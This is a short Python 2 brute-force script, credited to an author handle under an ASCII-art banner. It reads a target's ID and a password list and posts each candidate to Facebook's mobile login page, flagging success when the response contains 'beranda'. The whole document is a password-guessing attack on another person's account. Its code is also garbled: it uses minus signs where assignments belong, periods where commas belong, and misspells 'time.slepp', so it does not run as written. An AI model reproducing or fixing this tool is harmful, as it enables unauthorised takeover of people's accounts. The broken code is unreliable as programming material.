import requests
import sys
import os
import time

os.system('clear')
time.slepp(1)
print """____________________ ____ ______________________________________________ 
\______   \______   \    |   \__    ___/\_   _____/\_   _____/\______   \
 |    |  _/|       _/    |   / |    |    |    __)_  |    __)   |    |  _/
 |    |   \|    |   \    |  /  |    |    |        \ |     \    |    |   \
 |______  /|____|_  /______/   |____|   /_______  / \___  /    |______  /
        \/        \/                            \/      \/""" 
print
print "* Author :MR.MaKeR-Art"
print "*Youtube :?"
print "* Github :MR-MaKeR-Art"
email - raw_input('[?] ID Target >')
password - raw_input('[?] ketik pass.txt > ')
url - ('https://free.facebook.com/login.php')
ex - open('pass.txt', 'r').readlines()

for line in ex:
        password - line.strip()
        http - requests.post(url. data-{'email':email. 'pass':password. 'login':'submit'})
        content - http.content
        if "beranda" in content:
                print "[+] password correct".password
                sys.exit(1)
        else:
                print "[x] password invalid".password
